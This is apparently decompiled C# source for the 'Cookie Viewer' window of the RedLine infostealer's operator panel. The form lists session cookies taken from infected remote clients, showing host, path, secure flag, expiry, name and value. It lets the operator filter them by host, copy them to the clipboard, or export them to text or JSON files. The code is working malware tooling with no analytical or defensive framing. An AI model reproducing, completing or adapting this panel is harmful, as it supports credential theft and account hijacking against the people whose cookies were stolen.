using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using GuiLib;
using MetroSet_UI.Controls;
using MetroSet_UI.Design;
using RedLine.MainPanel.Data.Extensions;
using RedLine.MainPanel.LogExt;
using RedLine.MainPanel.Views.Old.Actions;
using RedLine.SharedModels;

namespace RedLine.MainPanel.Views;

public class CookieViewer : Form
{
	[CompilerGenerated]
	private object object_0;

	private object object_1;

	private object topHeader;

	private object mainTitle;

	private object closeBtn;

	private object cookiesListView;

	private object object_2;

	private object logContextMenu;

	private object copyToolStripMenuItem;

	private object clearBtn;

	private object m_a;

	private object m_b;

	private object c;

	private object m_d;

	private object m_e;

	private object f;

	private object object_3;

	private object object_4;

	private object object_5;

	private object saveBtn;

	private object dataGridViewTextBoxColumn1;

	private object dataGridViewCheckBoxColumn1;

	private object dataGridViewTextBoxColumn2;

	private object dataGridViewCheckBoxColumn2;

	private object dataGridViewTextBoxColumn3;

	private object dataGridViewTextBoxColumn4;

	private object dataGridViewTextBoxColumn5;

	private object object_6;

	private object searchTb;

	private BindingList<Cookie> Cookies
	{
		[CompilerGenerated]
		get
		{
			return (BindingList<Cookie>)object_0;
		}
		[CompilerGenerated]
		set
		{
			object_0 = value;
		}
	}

	public CookieViewer(BindingList<Cookie> _pairs)
	{
		d();
		this.AllowDraggBy((Control)topHeader);
		this.ApplyShadows();
		Cookies = _pairs;
		((DataGridView)cookiesListView).DataSource = Cookies;
	}

	private void closeBtn_Click(object sender, object e)
	{
		Cookies = null;
		Close();
	}

	private void copyToolStripMenuItem_Click(object sender, object e)
	{
		Cookie selectedItem = (Cookie)((DataGridView)cookiesListView).SelectedRows[0].DataBoundItem;
		Thread thread = new Thread((ThreadStart)delegate
		{
			Clipboard.SetText(selectedItem.ToText(), TextDataFormat.Text);
		});
		thread.ApartmentState = ApartmentState.STA;
		thread.IsBackground = true;
		thread.Start();
		MessageBox.Show(this, "Successfully saved to clipboard");
	}

	private void logContextMenu_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((DataGridView)cookiesListView).SelectedRows.Count == 0;
	}

	private void clearBtn_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)searchTb).Text))
		{
			return;
		}
		BindingList<Cookie> bindingList = new BindingList<Cookie>();
		foreach (Cookie cookie in Cookies)
		{
			if (cookie.Host.Contains(((AnimaTextBox)searchTb).Text))
			{
				bindingList.Add(cookie);
			}
		}
		((DataGridView)cookiesListView).DataSource = bindingList;
	}

	private void searchTb_TextChanged(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)searchTb).Text))
		{
			((DataGridView)cookiesListView).DataSource = Cookies;
		}
	}

	private async void saveBtn_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				using SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Filter = "Txt files (*.txt)|*.txt";
				saveFileDialog.DefaultExt = ".txt";
				saveFileDialog.CheckPathExists = true;
				saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
				saveFileDialog.RestoreDirectory = true;
				if (saveFileDialog.ShowDialog(this) == DialogResult.OK)
				{
					if (((DataGridView)cookiesListView).DataSource is BindingList<Cookie> { Count: >0 } bindingList)
					{
						if (!MainFrm.RemoteClientSettings.SaveAsJSON)
						{
							foreach (Cookie item in bindingList)
							{
								File.AppendAllText(saveFileDialog.FileName, item.ToText() + Environment.NewLine);
							}
						}
						else
						{
							File.WriteAllText(saveFileDialog.FileName, bindingList.CookiesToJSON() + Environment.NewLine);
						}
					}
					MessageBox.Show(this, "Successfully saved to file");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	private void topHeader_Paint(object sender, object e)
	{
		int num = ((Control)topHeader).Width - 1;
		int num2 = ((Control)topHeader).Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void a(object sender, object e)
	{
		int num = base.Width - 1;
		int num2 = base.Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void b(object sender, object e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && object_1 != null)
		{
			((IDisposable)object_1).Dispose();
		}
		base.Dispose(disposing);
	}

	private void d()
	{
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		object_1 = new Container();
		DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle2 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle3 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle4 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle5 = new DataGridViewCellStyle();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(CookieViewer));
		topHeader = new Panel();
		mainTitle = new Label();
		closeBtn = new Label();
		cookiesListView = new DataGridView();
		dataGridViewTextBoxColumn1 = new DataGridViewTextBoxColumn();
		dataGridViewCheckBoxColumn1 = new DataGridViewCheckBoxColumn();
		dataGridViewTextBoxColumn2 = new DataGridViewTextBoxColumn();
		dataGridViewCheckBoxColumn2 = new DataGridViewCheckBoxColumn();
		dataGridViewTextBoxColumn3 = new DataGridViewTextBoxColumn();
		dataGridViewTextBoxColumn4 = new DataGridViewTextBoxColumn();
		dataGridViewTextBoxColumn5 = new DataGridViewTextBoxColumn();
		logContextMenu = new ContextMenuStrip((IContainer)object_1);
		copyToolStripMenuItem = new ToolStripMenuItem();
		object_6 = new BindingSource((IContainer)object_1);
		object_5 = new BindingSource((IContainer)object_1);
		clearBtn = (object)new MetroSetButton();
		this.m_a = new Label();
		saveBtn = (object)new MetroSetButton();
		object_2 = new BindingSource((IContainer)object_1);
		searchTb = (object)new AnimaTextBox();
		((Control)topHeader).SuspendLayout();
		((ISupportInitialize)cookiesListView).BeginInit();
		((Control)logContextMenu).SuspendLayout();
		((ISupportInitialize)object_6).BeginInit();
		((ISupportInitialize)object_5).BeginInit();
		((ISupportInitialize)object_2).BeginInit();
		SuspendLayout();
		((Control)topHeader).BackColor = Color.FromArgb(52, 56, 67);
		((Control)topHeader).Controls.Add((Control)mainTitle);
		((Control)topHeader).Controls.Add((Control)closeBtn);
		((Control)topHeader).Dock = DockStyle.Top;
		((Control)topHeader).ForeColor = Color.Silver;
		((Control)topHeader).Location = new Point(0, 0);
		((Control)topHeader).Name = "topHeader";
		((Control)topHeader).Size = new Size(1068, 30);
		((Control)topHeader).TabIndex = 2;
		((Control)topHeader).Paint += topHeader_Paint;
		((Control)mainTitle).AutoSize = true;
		((Control)mainTitle).Font = new Font("Segoe UI", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
		((Control)mainTitle).ForeColor = Color.Red;
		((Control)mainTitle).Location = new Point(3, 4);
		((Control)mainTitle).Name = "mainTitle";
		((Control)mainTitle).Size = new Size(169, 20);
		((Control)mainTitle).TabIndex = 2;
		((Control)mainTitle).Text = "RedLine | Cookie Viewer";
		((Control)closeBtn).AutoSize = true;
		((Control)closeBtn).Font = new Font("Segoe UI Semibold", 12f, FontStyle.Bold, GraphicsUnit.Point, 204);
		((Control)closeBtn).ForeColor = Color.White;
		((Control)closeBtn).Location = new Point(1042, 3);
		((Control)closeBtn).Name = "closeBtn";
		((Control)closeBtn).Size = new Size(20, 21);
		((Control)closeBtn).TabIndex = 1;
		((Control)closeBtn).Text = "X";
		((Control)closeBtn).Click += closeBtn_Click;
		((DataGridView)cookiesListView).AllowUserToAddRows = false;
		((DataGridView)cookiesListView).AllowUserToDeleteRows = false;
		((DataGridView)cookiesListView).AllowUserToResizeColumns = false;
		((DataGridView)cookiesListView).AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle.ForeColor = Color.Silver;
		dataGridViewCellStyle.WrapMode = DataGridViewTriState.False;
		((DataGridView)cookiesListView).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		((DataGridView)cookiesListView).AutoGenerateColumns = false;
		((DataGridView)cookiesListView).BackgroundColor = Color.FromArgb(52, 56, 67);
		((DataGridView)cookiesListView).BorderStyle = BorderStyle.None;
		((DataGridView)cookiesListView).CellBorderStyle = DataGridViewCellBorderStyle.RaisedVertical;
		((DataGridView)cookiesListView).ClipboardCopyMode = DataGridViewClipboardCopyMode.Disable;
		((DataGridView)cookiesListView).ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle2.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle2.ForeColor = Color.Silver;
		dataGridViewCellStyle2.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle2.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle2.WrapMode = DataGridViewTriState.True;
		((DataGridView)cookiesListView).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		((DataGridView)cookiesListView).ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		((DataGridView)cookiesListView).Columns.AddRange((DataGridViewColumn)dataGridViewTextBoxColumn1, (DataGridViewColumn)dataGridViewCheckBoxColumn1, (DataGridViewColumn)dataGridViewTextBoxColumn2, (DataGridViewColumn)dataGridViewCheckBoxColumn2, (DataGridViewColumn)dataGridViewTextBoxColumn3, (DataGridViewColumn)dataGridViewTextBoxColumn4, (DataGridViewColumn)dataGridViewTextBoxColumn5);
		((Control)cookiesListView).ContextMenuStrip = (ContextMenuStrip)logContextMenu;
		((DataGridView)cookiesListView).DataSource = object_6;
		dataGridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle3.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle3.ForeColor = Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle3.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle3.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle3.WrapMode = DataGridViewTriState.False;
		((DataGridView)cookiesListView).DefaultCellStyle = dataGridViewCellStyle3;
		((DataGridView)cookiesListView).EditMode = DataGridViewEditMode.EditOnEnter;
		((DataGridView)cookiesListView).EnableHeadersVisualStyles = false;
		((DataGridView)cookiesListView).GridColor = Color.FromArgb(52, 60, 67);
		((Control)cookiesListView).Location = new Point(12, 36);
		((DataGridView)cookiesListView).MultiSelect = false;
		((Control)cookiesListView).Name = "cookiesListView";
		((DataGridView)cookiesListView).ReadOnly = true;
		((DataGridView)cookiesListView).RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle4.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle4.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle4.ForeColor = Color.Silver;
		dataGridViewCellStyle4.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle4.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle4.WrapMode = DataGridViewTriState.True;
		((DataGridView)cookiesListView).RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		((DataGridView)cookiesListView).RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		dataGridViewCellStyle5.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle5.ForeColor = Color.Silver;
		((DataGridView)cookiesListView).RowsDefaultCellStyle = dataGridViewCellStyle5;
		((DataGridView)cookiesListView).RowTemplate.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		((DataGridView)cookiesListView).RowTemplate.DefaultCellStyle.BackColor = Color.FromArgb(52, 56, 67);
		((DataGridView)cookiesListView).RowTemplate.DefaultCellStyle.ForeColor = Color.Silver;
		((DataGridView)cookiesListView).ScrollBars = ScrollBars.Vertical;
		((DataGridView)cookiesListView).SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		((DataGridView)cookiesListView).ShowEditingIcon = false;
		((Control)cookiesListView).Size = new Size(1050, 548);
		((Control)cookiesListView).TabIndex = 16;
		((DataGridViewColumn)dataGridViewTextBoxColumn1).DataPropertyName = "Host";
		((DataGridViewColumn)dataGridViewTextBoxColumn1).HeaderText = "Host";
		((DataGridViewColumn)dataGridViewTextBoxColumn1).Name = "dataGridViewTextBoxColumn1";
		((DataGridViewBand)dataGridViewTextBoxColumn1).ReadOnly = true;
		((DataGridViewColumn)dataGridViewTextBoxColumn1).Width = 200;
		((DataGridViewColumn)dataGridViewCheckBoxColumn1).DataPropertyName = "Http";
		((DataGridViewColumn)dataGridViewCheckBoxColumn1).HeaderText = "Http";
		((DataGridViewColumn)dataGridViewCheckBoxColumn1).Name = "dataGridViewCheckBoxColumn1";
		((DataGridViewBand)dataGridViewCheckBoxColumn1).ReadOnly = true;
		((DataGridViewColumn)dataGridViewTextBoxColumn2).DataPropertyName = "Path";
		((DataGridViewColumn)dataGridViewTextBoxColumn2).HeaderText = "Path";
		((DataGridViewColumn)dataGridViewTextBoxColumn2).Name = "dataGridViewTextBoxColumn2";
		((DataGridViewBand)dataGridViewTextBoxColumn2).ReadOnly = true;
		((DataGridViewColumn)dataGridViewCheckBoxColumn2).DataPropertyName = "Secure";
		((DataGridViewColumn)dataGridViewCheckBoxColumn2).HeaderText = "Secure";
		((DataGridViewColumn)dataGridViewCheckBoxColumn2).Name = "dataGridViewCheckBoxColumn2";
		((DataGridViewBand)dataGridViewCheckBoxColumn2).ReadOnly = true;
		((DataGridViewColumn)dataGridViewTextBoxColumn3).DataPropertyName = "Expires";
		((DataGridViewColumn)dataGridViewTextBoxColumn3).HeaderText = "Expires";
		((DataGridViewColumn)dataGridViewTextBoxColumn3).Name = "dataGridViewTextBoxColumn3";
		((DataGridViewBand)dataGridViewTextBoxColumn3).ReadOnly = true;
		((DataGridViewColumn)dataGridViewTextBoxColumn4).DataPropertyName = "Name";
		((DataGridViewColumn)dataGridViewTextBoxColumn4).HeaderText = "Name";
		((DataGridViewColumn)dataGridViewTextBoxColumn4).Name = "dataGridViewTextBoxColumn4";
		((DataGridViewBand)dataGridViewTextBoxColumn4).ReadOnly = true;
		((DataGridViewColumn)dataGridViewTextBoxColumn4).Width = 200;
		((DataGridViewColumn)dataGridViewTextBoxColumn5).DataPropertyName = "Value";
		((DataGridViewColumn)dataGridViewTextBoxColumn5).HeaderText = "Value";
		((DataGridViewColumn)dataGridViewTextBoxColumn5).Name = "dataGridViewTextBoxColumn5";
		((DataGridViewBand)dataGridViewTextBoxColumn5).ReadOnly = true;
		((DataGridViewColumn)dataGridViewTextBoxColumn5).Width = 200;
		((ToolStrip)logContextMenu).Items.AddRange(new ToolStripItem[1] { (ToolStripItem)copyToolStripMenuItem });
		((Control)logContextMenu).Name = "logContextMenu";
		((Control)logContextMenu).Size = new Size(103, 26);
		((ToolStripDropDown)logContextMenu).Opening += logContextMenu_Opening;
		((ToolStripItem)copyToolStripMenuItem).Name = "copyToolStripMenuItem";
		((ToolStripItem)copyToolStripMenuItem).Size = new Size(102, 22);
		((ToolStripItem)copyToolStripMenuItem).Text = "Copy";
		((ToolStripItem)copyToolStripMenuItem).Click += copyToolStripMenuItem_Click;
		((BindingSource)object_6).DataSource = typeof(Cookie);
		((MetroSetButton)clearBtn).DisabledBackColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)clearBtn).DisabledBorderColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)clearBtn).DisabledForeColor = Color.Gray;
		((Control)clearBtn).Font = new Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)clearBtn).HoverBorderColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)clearBtn).HoverColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)clearBtn).HoverTextColor = Color.White;
		((Control)clearBtn).Location = new Point(682, 615);
		((Control)clearBtn).Name = "clearBtn";
		((MetroSetButton)clearBtn).NormalBorderColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)clearBtn).NormalColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)clearBtn).NormalTextColor = Color.White;
		((MetroSetButton)clearBtn).PressBorderColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)clearBtn).PressColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)clearBtn).PressTextColor = Color.White;
		((Control)clearBtn).Size = new Size(102, 20);
		((MetroSetButton)clearBtn).Style = (Style)0;
		((MetroSetButton)clearBtn).StyleManager = null;
		((Control)clearBtn).TabIndex = 18;
		((Control)clearBtn).Text = "Search";
		((MetroSetButton)clearBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)clearBtn).ThemeName = "MetroLite";
		((Control)clearBtn).Click += clearBtn_Click;
		((Control)this.m_a).AutoSize = true;
		((Control)this.m_a).Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 204);
		((Control)this.m_a).ForeColor = Color.White;
		((Control)this.m_a).Location = new Point(161, 595);
		((Control)this.m_a).Name = "label1";
		((Control)this.m_a).Size = new Size(72, 15);
		((Control)this.m_a).TabIndex = 20;
		((Control)this.m_a).Text = "Enter a host:";
		((MetroSetButton)saveBtn).DisabledBackColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)saveBtn).DisabledBorderColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)saveBtn).DisabledForeColor = Color.Gray;
		((Control)saveBtn).Font = new Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)saveBtn).HoverBorderColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)saveBtn).HoverColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)saveBtn).HoverTextColor = Color.White;
		((Control)saveBtn).Location = new Point(682, 590);
		((Control)saveBtn).Name = "saveBtn";
		((MetroSetButton)saveBtn).NormalBorderColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)saveBtn).NormalColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)saveBtn).NormalTextColor = Color.White;
		((MetroSetButton)saveBtn).PressBorderColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)saveBtn).PressColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)saveBtn).PressTextColor = Color.White;
		((Control)saveBtn).Size = new Size(102, 20);
		((MetroSetButton)saveBtn).Style = (Style)0;
		((MetroSetButton)saveBtn).StyleManager = null;
		((Control)saveBtn).TabIndex = 21;
		((Control)saveBtn).Text = "Save list";
		((MetroSetButton)saveBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)saveBtn).ThemeName = "MetroLite";
		((Control)saveBtn).Click += saveBtn_Click;
		((AnimaTextBox)searchTb).Dark = false;
		((Control)searchTb).Location = new Point(159, 613);
		((AnimaTextBox)searchTb).MaxLength = 32767;
		((AnimaTextBox)searchTb).MultiLine = false;
		((Control)searchTb).Name = "searchTb";
		((AnimaTextBox)searchTb).Numeric = false;
		((AnimaTextBox)searchTb).ReadOnly = false;
		((Control)searchTb).Size = new Size(517, 23);
		((Control)searchTb).TabIndex = 31;
		((AnimaTextBox)searchTb).UseSystemPasswordChar = false;
		((Control)searchTb).TextChanged += searchTb_TextChanged;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(52, 56, 67);
		base.ClientSize = new Size(1068, 647);
		base.Controls.Add((Control)searchTb);
		base.Controls.Add((Control)saveBtn);
		base.Controls.Add((Control)this.m_a);
		base.Controls.Add((Control)clearBtn);
		base.Controls.Add((Control)cookiesListView);
		base.Controls.Add((Control)topHeader);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		base.Name = "CookieViewer";
		base.StartPosition = FormStartPosition.CenterScreen;
		Text = "CookieViewer";
		base.Paint += a;
		((Control)topHeader).ResumeLayout(performLayout: false);
		((Control)topHeader).PerformLayout();
		((ISupportInitialize)cookiesListView).EndInit();
		((Control)logContextMenu).ResumeLayout(performLayout: false);
		((ISupportInitialize)object_6).EndInit();
		((ISupportInitialize)object_5).EndInit();
		((ISupportInitialize)object_2).EndInit();
		ResumeLayout(performLayout: false);
		PerformLayout();
	}

	[CompilerGenerated]
	private void e()
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Txt files (*.txt)|*.txt";
			saveFileDialog.DefaultExt = ".txt";
			saveFileDialog.CheckPathExists = true;
			saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
			saveFileDialog.RestoreDirectory = true;
			if (saveFileDialog.ShowDialog(this) != DialogResult.OK)
			{
				return;
			}
			if (((DataGridView)cookiesListView).DataSource is BindingList<Cookie> { Count: >0 } bindingList)
			{
				if (!MainFrm.RemoteClientSettings.SaveAsJSON)
				{
					foreach (Cookie item in bindingList)
					{
						File.AppendAllText(saveFileDialog.FileName, item.ToText() + Environment.NewLine);
					}
				}
				else
				{
					File.WriteAllText(saveFileDialog.FileName, bindingList.CookiesToJSON() + Environment.NewLine);
				}
			}
			MessageBox.Show(this, "Successfully saved to file");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}
}
